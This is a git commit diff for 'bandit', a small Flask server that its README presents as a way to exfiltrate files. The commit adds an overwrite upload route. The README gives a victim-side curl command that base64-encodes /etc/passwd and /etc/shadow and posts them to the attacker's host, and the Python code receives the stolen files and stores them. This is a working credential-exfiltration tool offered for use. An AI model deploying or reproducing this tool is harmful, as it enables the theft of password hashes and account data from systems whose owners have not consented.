ad34d95577a18e66d9661a8ef53eef87cc80ffa5
rootabeta <rootabeta@protonmail.com>
2021-06-20 11:53:26 -0400

    Added overwrite option

--- README.md
+++ README.md
@@ -3,7 +3,11 @@ A quick and easy way to exfiltrate files
 
 # usage
 Attacker: ```python3 bandit.py [port]```
+
 Victim: ```curl -d "passwd=$(base64 /etc/passwd)&shadow=$(base64 /etc/shadow)" http://yourip:port/```
+
 It is important to use double quotes to allow bash to process reading the files and encoding them before upload
 
+If you wish to overwrite the existing files, instead of failing to upload if they exist on the server, specify the /overwrite path. This will scribble over any existing files on the server that conflict with the attempted upload, so use with caution. Yes, path travesal checks are made before file IO
 
+Victim: ```curl -d "passwd=$(base64 /etc/passwd)&shadow=$(base64 /etc/shadow)" http://yourip:port/overwrite```
--- bandit.py
+++ bandit.py
@@ -1,7 +1,7 @@
 import sys
 from flask import Flask,redirect, url_for, request
 import base64 #base64.b64decode(data)
-from os import path
+from os import path,mkdir
 import hashlib
 
 app = Flask(__name__)
@@ -14,6 +14,7 @@ def upload():
             content = request.form[fname]
             if "/" in fname:
                 fname = fname.split("/")[-1] #no path traversal for youuuu
+            fname = "uploads/" + fname
             contentd = base64.b64decode(content)
             assert(not path.exists(fname))
             with open(fname,"wb") as f:
@@ -29,9 +30,38 @@ def upload():
     
     return response
             
+@app.route("/overwrite",methods=['POST'])
+def overwrite():
+    response = "Manifest: \r\n"
+    for fname in request.form:
+        try:
+            exists = False
+            content = request.form[fname]
+            if "/" in fname:
+                fname = fname.split("/")[-1] #no path traversal for youuuu
+            fname = "uploads/" + fname
+            contentd = base64.b64decode(content)
+            if(path.exists(fname)):
+                exists = True
+            with open(fname,"wb") as f:
+                f.write(contentd)
+            md5_hash = hashlib.md5()
+            with open(fname, "rb") as h:
+                content = h.read()
+            md5_hash.update(content)
+            digest = md5_hash.hexdigest()     
+            if exists:
+                response += "{} -> Successfully overwritten ({})\r\n".format(fname,digest)
+            else: 
+                response += "{} -> Successfully uploaded ({})\r\n".format(fname,digest)
+        except:
+            response += "{} -> FAILED: Unknown\r\n".format(fname)
 
+    return response
     
 if __name__ == "__main__":
+    if not path.exists("uploads"):
+        mkdir("uploads")
     if len(sys.argv) == 1:
         port = 8080
     else:
